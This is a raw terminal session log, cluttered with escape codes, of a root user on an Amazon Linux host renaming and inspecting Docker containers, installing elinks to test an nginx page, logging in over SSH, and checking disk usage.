+[7m--More--[27m[K]0;root@docker:/tmp/Build[root@docker Build]# [H[2J[root@docker Build]# docker rename competent_mcnulty nginx-test1
+]0;root@docker:/tmp/Build[root@docker Build]# docker [Kdocke [Kr inspect nginx-test1|grep -i ipadd
+            "Secondary[01;31m[KIPAdd[m[Kresses": null,
+            "[01;31m[KIPAdd[m[Kress": "172.17.0.18",
+                    "[01;31m[KIPAdd[m[Kress": "172.17.0.18",
+]0;root@docker:/tmp/Build[root@docker Build]# elinks th[K[Khttp://172.17.0.18
+-bash: elinks: command not found
+]0;root@docker:/tmp/Build[root@docker Build]# yum install elinks -y
+Loaded plugins: priorities, update-motd, upgrade-helper
+amzn-main                                                           | 2.1 kB  00:00:00     
+amzn-updates                                                        | 2.3 kB  00:00:00     
+Resolving Dependencies
+--> Running transaction check
+---> Package elinks.x86_64 0:0.12-0.36.pre6.14.amzn1 will be installed
+--> Processing Dependency: libnss_compat_ossl.so.0()(64bit) for package: elinks-0.12-0.36.pre6.14.amzn1.x86_64
+--> Running transaction check
+---> Package nss_compat_ossl.x86_64 0:0.9.6-8.6.amzn1 will be installed
+--> Finished Dependency Resolution
+
+Dependencies Resolved
+
+===========================================================================================
+ Package               Arch         Version                          Repository       Size
+===========================================================================================
+Installing:
+ elinks                x86_64       0.12-0.36.pre6.14.amzn1          amzn-main       1.1 M
+Installing for dependencies:
+ nss_compat_ossl       x86_64       0.9.6-8.6.amzn1                  amzn-main        40 k
+
+Transaction Summary
+===========================================================================================
+Install  1 Package (+1 Dependent package)
+
+Total download size: 1.1 M
+Installed size: 2.6 M
+Downloading packages:
+(1/2): nss_compat_ossl-0.9.6-8.6.amzn1.x86_64.rpm                   |  40 kB  00:00:00     
+(2/2): elinks-0.12-0.36.pre6.14.amzn1.x86_64.rpm                    | 1.1 MB  00:00:00     
+-------------------------------------------------------------------------------------------
+Total                                                      2.4 MB/s | 1.1 MB  00:00:00     
+Running transaction check
+Running transaction test
+Transaction test succeeded
+Running transaction
+  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x8 [                                  ] 1/2  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x8 [#########################         ] 1/2  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x8 [###############################   ] 1/2  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x8 [################################  ] 1/2  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x8 [################################# ] 1/2  Installing : nss_compat_ossl-0.9.6-8.6.amzn1.x86_64                                  1/2 
+  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [                                  ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#                                 ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##                                ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###                               ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [####                              ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#####                             ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [######                            ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#######                           ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [########                          ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#########                         ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##########                        ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###########                       ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [############                      ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#############                     ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##############                    ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###############                   ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [################                  ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#################                 ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##################                ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###################               ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [####################              ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#####################             ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [######################            ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#######################           ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [########################          ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#########################         ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##########################        ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###########################       ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [############################      ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [#############################     ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [##############################    ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [###############################   ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [################################  ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86 [################################# ] 2/2  Installing : elinks-0.12-0.36.pre6.14.amzn1.x86_64                                   2/2 
+  Verifying  : elinks-0.12-0.36.pre6.14.amzn1.x86_64                                   1/2 
+  Verifying  : nss_compat_ossl-0.9.6-8.6.amzn1.x86_64                                  2/2 
+
+Installed:
+  elinks.x86_64 0:0.12-0.36.pre6.14.amzn1                                                  
+
+Dependency Installed:
+  nss_compat_ossl.x86_64 0:0.9.6-8.6.amzn1                                                 
+
+Complete!
+]0;root@docker:/tmp/Build[root@docker Build]# [1@(reverse-i-search)`':[Ce': yum install elinks -y[1@l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@i[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Celinks http://172.17.0.18[4P[root@docker Build]#[C
+)07[?9h[?1000h[?1001s[?1000h[1;1H[2J[1;1H[1;1H[24m[0;30;47m                                                                                           [2;1H[0;30;40m                                                                                           [3;1H                                                                                           [4;1H                                                                                           [5;1H                                                                                           [6;1H                                                                                           [7;1H                                                                                           [8;1H                                                                                           [9;1H                                                                                           [10;1H                                                                                           [11;1H                                                                                           [12;1H         [0;30;47m                                                                        [0;30;40m          [13;1H         [0;30;47m   ╔════════════════════════════════════════════════════════════════╗   [0;30;40m          [14;1H         [0;30;47m   ║                                                                ║   [0;30;40m          [15;1H         [0;30;47m   ║                       Welcome to ELinks!                       ║   [0;30;40m          [16;1H         [0;30;47m   ║                                                                ║   [0;30;40m          [17;1H         [0;30;47m   ║  Press ESC for menu. Documentation is available in Help menu.  ║   [0;30;40m          [18;1H         [0;30;47m   ║                                                                ║   [0;30;40m          [19;1H         [0;30;47m   ║                            [1m[0;33;42;1m[ [0;37;44;1mO[0;33;42;1mK ][0;30;47m                              ║   [0;30;40m          [20;1H         [0;30;47m   ╚════════════════════════════════════════════════════════════════╝   [0;30;40m          [21;1H         [0;30;47m                                                                        [0;30;40m          [22;1H                                                                                           [23;1H                                                                                           [24;1H                                                                                           [25;1H                                                                                           [26;1H                                                                                           [27;1H                                                                                           [28;1H                                                                                           [29;1H                                                                                           [30;1H                                                                                           [31;1H                                                                                           [32;1H                                                                                           [33;1H[0;30;47mLooking up host                                                                   [------][37;40m[0m[19;44H[33;1H[24m[0;30;47mMaking connection[37;40m[0m[19;44H[13;21H[24m[0;30;47m   ╔[13;68H╗   [14;24H║[14;68H║[15;24H║  Unable to retrieve http://172.17.0.18/:  ║[16;24H║[16;68H║[17;22H  ║            Connection refused             ║   [18;24H║[18;68H║[19;24H║[19;42H [1m[0;33;42;1m[ [0;37;44;1mO[0;33;42;1mK ][19;68H[0;30;47m║[20;21H   ╚[20;68H╝   [33;1H                 [37;40m[0m[19;45H[13;21H[24m[0;30;47m════[13;68H════[14;24H [14;68H [15;24H             Welcome to ELinks!              [16;24H [16;68H [17;22HESC for menu. Documentation is available in Help m[18;24H [18;68H [19;24H [19;42H[1m[0;33;42;1m[ [0;37;44;1mO[0;33;42;1mK ][0;30;47m [19;68H [20;21H════[20;68H════[37;40m[0m[19;44H[12;10H[24m[0;30;40m                                                                        [13;10H                                                                        [14;10H                                                                        [15;10H                                                                        [16;10H                                                                        [17;10H                                                                        [18;10H                                                                        [19;10H                                                                        [20;10H                                                                        [21;10H                                                                        [37;40m[0m[1;1H[13;23H[24m[0;30;47m                                              [14;23H   ╔══════════════════════════════════════╗   [15;23H   ║                                      ║   [16;23H   ║  Do you really want to exit ELinks?  ║   [17;23H   ║                                      ║   [18;23H   ║          [1m[0;33;42;1m[ [0;37;44;1mY[0;33;42;1mes ][0;30;47m   [1m[0;37;44;1m[ [0;33;44;1mN[0;37;44;1mo ][0;30;47m            ║   [19;23H   ╚══════════════════════════════════════╝   [20;23H                                              [37;40m[0m[18;39H[2J[1;1H[1;1H[24m[0;30;47m                                                                                           [2;1H[0;30;40m                                                                                           [3;1H                                                                                           [4;1H                                                                                           [5;1H                                                                                           [6;1H                                                                                           [7;1H                                                                                           [8;1H                                                                                           [9;1H                                                                                           [10;1H                                                                                           [11;1H                                                                                           [12;1H                                                                                           [13;1H                                                                                           [14;1H                      [0;30;47m                                              [0;30;40m                       [15;1H                      [0;30;47m   ╔══════════════════════════════════════╗   [0;30;40m                       [16;1H                      [0;30;47m   ║                                      ║   [0;30;40m                       [17;1H                      [0;30;47m   ║  Do you really want to exit ELinks?  ║   [0;30;40m                       [18;1H                      [0;30;47m   ║                                      ║   [0;30;40m                       [19;1H                      [0;30;47m   ║          [1m[0;33;42;1m[ [0;37;44;1mY[0;33;42;1mes ][0;30;47m   [1m[0;37;44;1m[ [0;33;44;1mN[0;37;44;1mo ][0;30;47m            ║   [0;30;40m                       [20;1H                      [0;30;47m   ╚══════════════════════════════════════╝   [0;30;40m                       [21;1H                      [0;30;47m                                              [0;30;40m                       [22;1H                                                                                           [23;1H                                                                                           [24;1H                                                                                           [25;1H                                                                                           [26;1H                                                                                           [27;1H                                                                                           [28;1H                                                                                           [29;1H                                                                                           [30;1H                                                                                           [31;1H                                                                                           [32;1H                                                                                           [33;1H                                                                                           [34;1H                                                                                           [35;1H[0;30;47m                                                                                  [------][37;40m[0m[19;39HUsing username "root".
+root@35.177.19.242's password: 
+Last failed login: Sun Sep 17 04:43:08 UTC 2017 from 132.248.214.172 on ssh:notty
+There were 8 failed login attempts since the last successful login.
+Last login: Sun Sep 17 03:40:37 2017 from 212.93.55.20
+
+       __|  __|_  )
+       _|  (     /   Amazon Linux AMI
+      ___|\___|___|
+
+https://aws.amazon.com/amazon-linux-ami/2017.03-release-notes/
+16 package(s) needed for security, out of 20 available
+Run "sudo yum update" to apply all updates.
+]0;root@docker:~[?1034h[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                NAMES
+985e55cc2950        nginx:latest        "/bin/bash"         3 hours ago         Up 3 hours          0.0.0.0:80->80/tcp   nginx-test1
+1624f3ad4b4e        nginx:latest        "/bin/bash"         4 hours ago         Up 4 hours          80/tcp               heuristic_shirley
+da34b62f6722        env:v2              "/bin/bash"         4 hours ago         Up 4 hours                               suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         5 hours ago         Up 5 hours                               unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         5 hours ago         Up 5 hours                               myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         5 hours ago         Up 5 hours                               myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         5 hours ago         Up 5 hours                               myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"         29 hours ago        Up 5 hours                               gifted_wescoff
+]0;root@docker:~[root@docker ~]# elinks http://localhost
+)07[?9h[?1000h[?1001s[?1000h[1;1H[2J[1;1H[1;1H[24m[0;30;47m                                                                                                                                               [2;1H[0;30;40m                                                                                                                                               [3;1H                                                                                                                                               [4;1H                                                                                                                                               [5;1H                                                                                                                                               [6;1H                                                                                                                                               [7;1H                                                                                                                                               [8;1H                                                                                                                                               [9;1H                                                                                                                                               [10;1H                                                                                                                                               [11;1H                                                                                                                                               [12;1H                                                                                                                                               [13;1H                                                                                                                                               [14;1H                                                                                                                                               [15;1H                                                                                                                                               [16;1H                                                                                                                                               [17;1H                                                                                                                                               [18;1H                                                                                                                                               [19;1H                                                                                                                                               [20;1H                                                                                                                                               [21;1H                                                                                                                                               [22;1H                                                                                                                                               [23;1H                                                                                                                                               [24;1H                                                                                                                                               [25;1H                                                                                                                                               [26;1H                                                                                                                                               [27;1H                                                                                                                                               [28;1H                                                                                                                                               [29;1H                                                                                                                                               [30;1H                                                                                                                                               [31;1H                                                                                                                                               [32;1H                                                                                                                                               [33;1H                                                                                                                                               [34;1H                                                                                                                                               [35;1H                                                                                                                                               [36;1H                                                                                                                                               [37;1H                                                                                                                                               [38;1H                                                                                                                                               [39;1H[0;30;47mLooking up host                                                                                                                       [------][37;40m[0m[1;1H[39;1H[24m[0;30;47mMaking connection[37;40m[0m[1;1H[39;1H[24m[0;30;47mRequest sent     [37;40m[0m[1;1H[39;1H[24m[0;30;47mMaking connection[37;40m[0m[1;1H[39;1H[24m[0;30;47mRequest sent     [37;40m[0m[1;1H[39;1H[24m[0;30;47mMaking connection[37;40m[0m[1;1H[39;1H[24m[0;30;47mRequest sent     [37;40m[0m[1;1H[15;48H[24m[0;30;47m                                                 [16;48H   ╔═════════════════════════════════════════╗   [17;48H   ║                                         ║   [18;48H   ║  Unable to retrieve http://localhost/:  ║   [19;48H   ║                                         ║   [20;48H   ║        Connection reset by peer         ║   [21;48H   ║                                         ║   [22;48H   ║                 [1m[0;33;42;1m[ [0;37;44;1mO[0;33;42;1mK ][0;30;47m                  ║   [23;48H   ╚═════════════════════════════════════════╝   [24;48H                                                 [39;1H            [37;40m[0m[22;71H[15;48H[24m[0;30;40m                                                 [16;48H                                                 [17;48H                                                 [18;48H                                                 [19;48H                                                 [20;48H                                                 [21;48H                                                 [22;48H                                                 [23;48H                                                 [24;48H                                                 [37;40m[0m[1;1H[16;49H[24m[0;30;47m                                              [17;49H   ╔══════════════════════════════════════╗   [18;49H   ║                                      ║   [19;49H   ║  Do you really want to exit ELinks?  ║   [20;49H   ║                                      ║   [21;49H   ║          [1m[0;33;42;1m[ [0;37;44;1mY[0;33;42;1mes ][0;30;47m   [1m[0;37;44;1m[ [0;33;44;1mN[0;37;44;1mo ][0;30;47m            ║   [22;49H   ╚══════════════════════════════════════╝   [23;49H                                              [37;40m[0m[21;65H[2J[?9l[?1000l8 ]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                NAMES
+985e55cc2950        nginx:latest        "/bin/bash"         3 hours ago         Up 3 hours          0.0.0.0:80->80/tcp   nginx-test1
+1624f3ad4b4e        nginx:latest        "/bin/bash"         4 hours ago         Up 4 hours          80/tcp               heuristic_shirley
+da34b62f6722        env:v2              "/bin/bash"         4 hours ago         Up 4 hours                               suspicious_ardinghelli
+ec9a0f95b482        user:v1             "/bin/bash"         5 hours ago         Up 5 hours                               unruffled_bhabha
+2d88c4260a54        testimage:v1        "/bin/bash"         5 hours ago         Up 5 hours                               myimage_test2
+87ac319e7836        myimage:v1          "/bin/bash"         5 hours ago         Up 5 hours                               myimage_test
+c63f9a1e9732        centos:centos6      "/bin/bash"         5 hours ago         Up 5 hours                               myimage
+745755edb7e9        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test5
+b48b0ef02c25        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test4
+cd549e64d7c2        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test3
+0bb0cb6bb94a        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test2
+b47c8936c814        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               test1
+012ab3d2bfca        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server4
+477ec3b7f65b        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server3
+c35d80212462        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server2
+ca7fd4236f6a        ubuntu:xenial       "/bin/bash"         5 hours ago         Up 5 hours                               server1
+a60f1bb6981e        ubuntu:xenial       "/bin/bash"         29 hours ago        Up 5 hours                               gifted_wescoff
+]0;root@docker:~[root@docker ~]# docker exec nginx-test1 service nginx restart
+Restarting nginx: nginx.
+
+^C
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# 
+]0;root@docker:~[root@docker ~]# [5@(reverse-i-search)`':[Ce': docker exec nginx-test1 service nginx restart[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[21Pl': elinks http://localhost[1@i[C[C[C[1@n[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C172.17.0.18[9P[root@docker ~]#[C
+)07[?9h[?1000h[?1001s[?1000h[1;1H[2J[1;1H[1;1H[24m[0;30;47m                                                                                                                                               [2;1H[0;30;40m                                                                                                                                               [3;1H                                                                                                                                               [4;1H                                                                                                                                               [5;1H                                                                                                                                               [6;1H                                                                                                                                               [7;1H                                                                                                                                               [8;1H                                                                                                                                               [9;1H                                                                                                                                               [10;1H                                                                                                                                               [11;1H                                                                                                                                               [12;1H                                                                                                                                               [13;1H                                                                                                                                               [14;1H                                                                                                                                               [15;1H                                                                                                                                               [16;1H                                                                                                                                               [17;1H                                                                                                                                               [18;1H                                                                                                                                               [19;1H                                                                                                                                               [20;1H                                                                                                                                               [21;1H                                                                                                                                               [22;1H                                                                                                                                               [23;1H                                                                                                                                               [24;1H                                                                                                                                               [25;1H                                                                                                                                               [26;1H                                                                                                                                               [27;1H                                                                                                                                               [28;1H                                                                                                                                               [29;1H                                                                                                                                               [30;1H                                                                                                                                               [31;1H                                                                                                                                               [32;1H                                                                                                                                               [33;1H                                                                                                                                               [34;1H                                                                                                                                               [35;1H                                                                                                                                               [36;1H                                                                                                                                               [37;1H                                                                                                                                               [38;1H                                                                                                                                               [39;1H[0;30;47mLooking up host                                                                                                                       [------][37;40m[0m[1;1H[39;1H[24m[0;30;47mMaking connection[37;40m[0m[1;1H[39;1H[24m[0;30;47mRequest sent     [37;40m[0m[1;1H[1;126H[24m[0;30;47mWelcome to nginx![2;64H[1m[0;37;40;1mWelcome to nginx![4;4H[0;37;40mIf you see this page, the nginx web server is successfully installed and working. Further configuration is required.[6;4HFor online documentation and support please refer to [0;37;44mnginx.org[0;37;40m.[7;4HCommercial support is available at [1m[0;34;40;1mnginx.com[0;37;40m.[9;4H[0;36;40mThank you for using nginx.[39;1H[0;30;47mhttp://nginx.org/[37;40m[0m[6;57H[16;49H[24m[0;30;47m                                              [17;49H   ╔══════════════════════════════════════╗   [18;49H   ║                                      ║   [19;49H   ║  Do you really want to exit ELinks?  ║   [20;49H   ║                                      ║   [21;49H   ║          [1m[0;33;42;1m[ [0;37;44;1mY[0;33;42;1mes ][0;30;47m   [1m[0;37;44;1m[ [0;33;44;1mN[0;37;44;1mo ][0;30;47m            ║   [22;49H   ╚══════════════════════════════════════╝   [23;49H                                              [37;40m[0m[21;65H[2J[?9l[?1000l8 ]0;root@docker:~[root@docker ~]# [5@(reverse-i-search)`':[Ce': elinks http://172.17.0.18[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@l[C[C[C[1@i[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2Plocalhost[8P[root@docker ~]#[C
+)07[?9h[?1000h[?1001s[?1000h[1;1H[2J[1;1H[1;1H[24m[0;30;47m                                                                                                                                               [2;1H[0;30;40m                                                                                                                                               [3;1H                                                                                                                                               [4;1H                                                                                                                                               [5;1H                                                                                                                                               [6;1H                                                                                                                                               [7;1H                                                                                                                                               [8;1H                                                                                                                                               [9;1H                                                                                                                                               [10;1H                                                                                                                                               [11;1H                                                                                                                                               [12;1H                                                                                                                                               [13;1H                                                                                                                                               [14;1H                                                                                                                                               [15;1H                                                                                                                                               [16;1H                                                                                                                                               [17;1H                                                                                                                                               [18;1H                                                                                                                                               [19;1H                                                                                                                                               [20;1H                                                                                                                                               [21;1H                                                                                                                                               [22;1H                                                                                                                                               [23;1H                                                                                                                                               [24;1H                                                                                                                                               [25;1H                                                                                                                                               [26;1H                                                                                                                                               [27;1H                                                                                                                                               [28;1H                                                                                                                                               [29;1H                                                                                                                                               [30;1H                                                                                                                                               [31;1H                                                                                                                                               [32;1H                                                                                                                                               [33;1H                                                                                                                                               [34;1H                                                                                                                                               [35;1H                                                                                                                                               [36;1H                                                                                                                                               [37;1H                                                                                                                                               [38;1H                                                                                                                                               [39;1H[0;30;47mLooking up host                                                                                                                       [------][37;40m[0m[1;1H[39;1H[24m[0;30;47mMaking connection[37;40m[0m[1;1H[39;1H[24m[0;30;47mRequest sent     [37;40m[0m[1;1H[1;126H[24m[0;30;47mWelcome to nginx![2;64H[1m[0;37;40;1mWelcome to nginx![4;4H[0;37;40mIf you see this page, the nginx web server is successfully installed and working. Further configuration is required.[6;4HFor online documentation and support please refer to [0;37;44mnginx.org[0;37;40m.[7;4HCommercial support is available at [1m[0;34;40;1mnginx.com[0;37;40m.[9;4H[0;36;40mThank you for using nginx.[39;1H[0;30;47mhttp://nginx.org/[37;40m[0m[6;57H[16;49H[24m[0;30;47m                                              [17;49H   ╔══════════════════════════════════════╗   [18;49H   ║                                      ║   [19;49H   ║  Do you really want to exit ELinks?  ║   [20;49H   ║                                      ║   [21;49H   ║          [1m[0;33;42;1m[ [0;37;44;1mY[0;33;42;1mes ][0;30;47m   [1m[0;37;44;1m[ [0;33;44;1mN[0;37;44;1mo ][0;30;47m            ║   [22;49H   ╚══════════════════════════════════════╝   [23;49H                                              [37;40m[0m[21;65H[2J[?9l[?1000l8 ]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# df -hT
+Filesystem     Type      Size  Used Avail Use% Mounted on
+devtmpfs       devtmpfs  489M  156K  488M   1% /dev
+tmpfs          tmpfs     497M     0  497M   0% /dev/shm
+/dev/xvda1     ext4      7.8G  3.2G  4.6G  41% /
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/c14e14ca70d7c97d9cccc705f7a53f98677e3e3f7f12fbb584c9c30576e54a0f/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/a60f1bb6981eb239707fabac0d14f73d94989f2e9d541843f7d4bb9e63e3755d/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/58744576f62f863838fc2e6fb94bfdee7f0b5f396c1b6ff7d260cd4176ce376e/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/ca7fd4236f6a3906673a2d9605c36977af511cc389ce4062420a748521892b54/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/adbb6b1f3fa1574bad5146a14d06f7240421caa60589ba68b0d9fab3a26e4652/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/c35d802124625b3f2caeb732726ad41926b2d13d0bfc0d24c9c0a226bfc62661/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/9a93ad0e090b5699f5a2d6de210e683ca442201c5347b109f648351018a498e8/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/477ec3b7f65b31043fa7d3a8ab79ed530bea4133a508382dfaabe80253d4db2f/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/be4c8aefe29cd5b541f63d9ae2b6abc3031f099d939a4972414f310c3fbfdd04/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/012ab3d2bfca4054e012a0fe49aeec15486643feac34307b891e6e41f8238b43/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/01f26c49a68e8860a7fcf489e91c1cb70671a535dfd37d0fa7b2839e676fd32a/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/b47c8936c814bd5559b03b9e2c412f79dfa7a3d29f6deb5e3ca8650a5c807d13/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/dbe45e1f056534f8afd9afee62c9dba09806029d3c767c95c769e07cc4f123ab/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/0bb0cb6bb94a293cde9eefa2821487630599dda86274bd5868c439e777f2db35/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/1f035750482f91e4ce9803dab77f8ac16e7474a90f78a13cad61d9154777e38d/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/cd549e64d7c2576786fc448bce727970ee611b9318be5a72ce96edf1d24a770a/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/5ad2db1b67f83d412cf412d93aeb070c89eb743248a8455d47b24e0786d9851a/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/b48b0ef02c25354fc0f99faf897f406f36a55825932a763e8b910851a54dcb15/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/e14706ef3b3a60537eda27a0f6371a03e7440884bdffd9c85c0158b4afccc079/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/745755edb7e9470756f6a6009f6b2a2fb22a63dd82ace126f6f0a92df133ff71/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/be70f4e2a10a7f2c57cc3ba06f2f0a4a44b3cb3f965c8bf9c60deea05bff0f46/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/c63f9a1e97322a75ef7a00ac8c82254c0467af9d8a7cb35a890efa9e86f3c44f/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/47a868ad34db78f39f0c06d4bae32a8bfac2ffb89696da05b431b547ed100fb9/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/87ac319e7836fa529cc2abf678215b2c9bb8c422565bf136ede5043ea88c5d42/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/f44df3529875308cf633b2f37f387120d14f840db6cf7a39b733034a797fcd0e/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/2d88c4260a54d8237548382ec8d5d45f46ae5919de0a037ac33eec33dbe69228/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/561b2700d67c2f15677bc8ecec2b56f1de2eb2f1453485502404ae930d9b7ca4/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/ec9a0f95b482b213310bda1d0ecd9c6146b95a44d9a56b283d310bf65b4d0b60/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/624ec586c34ffcab0a444d2e3c74be6bedd1be03e424b61f863d8613aa43819e/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/da34b62f6722ee49b26bd5a8cbf5ad0c2b88b18cfdf14c4394494c544c73bc77/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/a2aec1be2a886c5e080bb9b701725209d6e42daf091c23d490b074258c5514f5/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/1624f3ad4b4e3601da1934b8feb01f7e737b163c6978731d9342faa52b7cd477/shm
+overlay        overlay   7.8G  3.2G  4.6G  41% /var/lib/docker/overlay2/15adcaad4bb6d627b4fb229addc8bf34fa000ef8a1985402ee615249c0533878/merged
+shm            tmpfs      64M     0   64M   0% /var/lib/docker/containers/985e55cc29505b761bd04d58983ebf64b0a7664724bc0c0d18c2b22880fd0469/shm
+]0;root@docker:~[root@docker ~]# [H[2J[root@docker ~]# 
